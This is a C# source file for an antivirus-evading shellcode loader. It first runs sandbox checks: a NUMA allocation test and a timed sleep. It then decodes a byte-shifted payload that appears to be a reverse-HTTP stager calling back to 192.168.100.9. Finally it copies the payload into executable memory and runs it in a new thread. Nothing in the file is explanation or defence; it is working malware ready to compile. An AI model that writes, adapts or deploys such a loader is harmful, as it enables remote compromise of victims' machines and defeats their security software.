using System;
using System.Runtime.InteropServices;

namespace AV
{
    class Program
    {
        // VirtualAlloc
        //CreateThread
        //WaitForSingleObject

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        static void Main(string[] args)
        {

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            // BUF PREVIAMENTE CIFRADO
            byte[] buf = new byte[522] {
 0xfe, 0xea, 0x91, 0x02, 0x02, 0x02, 0x62, 0x33, 0xd4, 0x8b, 0xe7, 0x66, 0x8d, 0x54, 0x32, 0x8d, 0x54, 0x0e, 0x8d, 0x54, 0x16, 0x8d, 0x74, 0x2a, 0x33, 0x01, 0x11, 0xb9, 0x4c, 0x28, 0x33, 0xc2, 0xae, 0x3e, 0x63, 0x7e, 0x04, 0x2e, 0x22, 0xc3, 0xd1, 0x0f, 0x03, 0xc9, 0x4b, 0x77, 0xf1, 0x54, 0x59, 0x8d, 0x54, 0x12, 0x8d, 0x44, 0x3e, 0x03, 0xd2, 0x8d, 0x42, 0x7a, 0x87, 0xc2, 0x76, 0x4e, 0x03, 0xd2, 0x8d, 0x5a, 0x22, 0x8d, 0x4a, 0x1a, 0x52, 0x03, 0xd5, 0x87, 0xcb, 0x76, 0x3e, 0x33, 0x01, 0x4b, 0x8d, 0x36, 0x8d, 0x03, 0xd8, 0x33, 0xc2, 0xc3, 0xd1, 0x0f, 0xae, 0x03, 0xc9, 0x3a, 0xe2, 0x77, 0xf6, 0x05, 0x7f, 0xfa, 0x3d, 0x7f, 0x26, 0x77, 0xe2, 0x5a, 0x8d, 0x5a, 0x26, 0x03, 0xd5, 0x68, 0x8d, 0x0e, 0x4d, 0x8d, 0x5a, 0x1e, 0x03, 0xd5, 0x8d, 0x06, 0x8d, 0x03, 0xd2, 0x8b, 0x46, 0x26, 0x26, 0x5d, 0x5d, 0x63, 0x5b, 0x5c, 0x53, 0x01, 0xe2, 0x5a, 0x61, 0x5c, 0x8d, 0x14, 0xeb, 0x82, 0x01, 0x01, 0x01, 0x5f, 0x6a, 0x70, 0x67, 0x76, 0x02, 0x6a, 0x79, 0x6b, 0x70, 0x6b, 0x56, 0x6a, 0x4e, 0x79, 0x28, 0x09, 0x01, 0xd7, 0x33, 0xdd, 0x55, 0x55, 0x55, 0x55, 0x55, 0xea, 0x40, 0x02, 0x02, 0x02, 0x4f, 0x71, 0x7c, 0x6b, 0x6e, 0x6e, 0x63, 0x31, 0x37, 0x30, 0x32, 0x22, 0x2a, 0x59, 0x6b, 0x70, 0x66, 0x71, 0x79, 0x75, 0x22, 0x50, 0x56, 0x22, 0x38, 0x30, 0x33, 0x3d, 0x22, 0x56, 0x74, 0x6b, 0x66, 0x67, 0x70, 0x76, 0x31, 0x39, 0x30, 0x32, 0x3d, 0x22, 0x74, 0x78, 0x3c, 0x33, 0x33, 0x30, 0x32, 0x2b, 0x22, 0x6e, 0x6b, 0x6d, 0x67, 0x22, 0x49, 0x67, 0x65, 0x6d, 0x71, 0x02, 0x6a, 0x3c, 0x58, 0x7b, 0xa9, 0x01, 0xd7, 0x55, 0x55, 0x6c, 0x05, 0x55, 0x55, 0x6a, 0x5e, 0x13, 0x02, 0x02, 0xea, 0xe5, 0x02, 0x02, 0x02, 0x31, 0x63, 0x2f, 0x70, 0x35, 0x55, 0x4d, 0x3b, 0x6e, 0x5a, 0x79, 0x2f, 0x45, 0x61, 0x36, 0x52, 0x2f, 0x36, 0x51, 0x32, 0x39, 0x74, 0x53, 0x37, 0x44, 0x79, 0x7c, 0x57, 0x67, 0x6f, 0x49, 0x76, 0x43, 0x4e, 0x4b, 0x73, 0x63, 0x49, 0x67, 0x61, 0x78, 0x73, 0x77, 0x36, 0x48, 0x5c, 0x52, 0x76, 0x67, 0x3b, 0x58, 0x69, 0x6a, 0x35, 0x52, 0x33, 0x6c, 0x51, 0x72, 0x71, 0x55, 0x6f, 0x37, 0x59, 0x76, 0x51, 0x5a, 0x79, 0x6f, 0x58, 0x3a, 0x64, 0x4a, 0x67, 0x6a, 0x59, 0x4f, 0x65, 0x50, 0x63, 0x6b, 0x54, 0x2f, 0x02, 0x52, 0x6a, 0x59, 0x8b, 0xa1, 0xc8, 0x01, 0xd7, 0x8b, 0xc8, 0x55, 0x6a, 0x02, 0x34, 0xea, 0x86, 0x55, 0x55, 0x55, 0x59, 0x55, 0x58, 0x6a, 0xed, 0x57, 0x30, 0x3d, 0x01, 0xd7, 0x98, 0x6c, 0x0c, 0x61, 0x6a, 0x82, 0x35, 0x02, 0x02, 0x8b, 0xe2, 0x6c, 0x06, 0x52, 0x6c, 0x21, 0x58, 0x6a, 0x77, 0x48, 0xa0, 0x88, 0x01, 0xd7, 0x55, 0x55, 0x55, 0x55, 0x58, 0x6a, 0x2f, 0x08, 0x1a, 0x7d, 0x01, 0xd7, 0x87, 0xc2, 0x77, 0x16, 0x6a, 0x8a, 0x15, 0x02, 0x02, 0x6a, 0x46, 0xf2, 0x37, 0xe2, 0x01, 0xd7, 0x51, 0x77, 0xcf, 0xea, 0x4c, 0x02, 0x02, 0x02, 0x6c, 0x42, 0x6a, 0x02, 0x12, 0x02, 0x02, 0x6a, 0x02, 0x02, 0x42, 0x02, 0x55, 0x6a, 0x5a, 0xa6, 0x55, 0xe7, 0x01, 0xd7, 0x95, 0x55, 0x55, 0x8b, 0xe9, 0x59, 0x6a, 0x02, 0x22, 0x02, 0x02, 0x55, 0x58, 0x6a, 0x14, 0x98, 0x8b, 0xe4, 0x01, 0xd7, 0x87, 0xc2, 0x76, 0xd1, 0x8d, 0x09, 0x03, 0xc5, 0x87, 0xc2, 0x77, 0xe7, 0x5a, 0xc5, 0x61, 0xea, 0x6d, 0x01, 0x01, 0x01, 0x33, 0x3b, 0x34, 0x30, 0x33, 0x38, 0x3a, 0x30, 0x33, 0x32, 0x32, 0x30, 0x3b, 0x02, 0xbd, 0xf2, 0xb7, 0xa4, 0x58, 0x6c, 0x02, 0x55, 0x01, 0xd7 };

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
            }

            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);

        }
    }
}
